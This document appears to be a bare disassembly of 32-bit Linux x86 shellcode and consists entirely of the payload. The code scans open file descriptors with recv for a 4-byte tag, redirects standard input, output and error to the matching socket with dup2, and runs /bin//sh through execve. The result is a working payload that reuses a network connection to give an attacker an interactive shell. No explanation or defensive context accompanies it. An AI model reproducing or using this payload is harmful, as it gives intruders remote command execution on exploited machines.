00000000  31DB              xor ebx,ebx
00000002  53                push ebx
00000003  89E6              mov esi,esp
00000005  6A40              push byte +0x40
00000007  B70A              mov bh,0xa
00000009  53                push ebx
0000000A  56                push esi
0000000B  53                push ebx
0000000C  89E1              mov ecx,esp
0000000E  86FB              xchg bh,bl
00000010  66FF01            inc word [ecx]
00000013  6A66              push byte +0x66
00000015  58                pop eax
00000016  CD80              int 0x80
00000018  813E39733961      cmp dword [esi],0x61397339
0000001E  75F0              jnz 0x10
00000020  5F                pop edi
00000021  89FB              mov ebx,edi
00000023  6A02              push byte +0x2
00000025  59                pop ecx
00000026  6A3F              push byte +0x3f
00000028  58                pop eax
00000029  CD80              int 0x80
0000002B  49                dec ecx
0000002C  79F8              jns 0x26
0000002E  6A0B              push byte +0xb
00000030  58                pop eax
00000031  99                cdq
00000032  52                push edx
00000033  682F2F7368        push dword 0x68732f2f ;push hs// on the stack
00000038  682F62696E        push dword 0x6e69622f ;push nib/ on the stack
0000003D  89E3              mov ebx,esp
0000003F  52                push edx
00000040  53                push ebx
00000041  89E1              mov ecx,esp
00000043  CD80              int 0x80
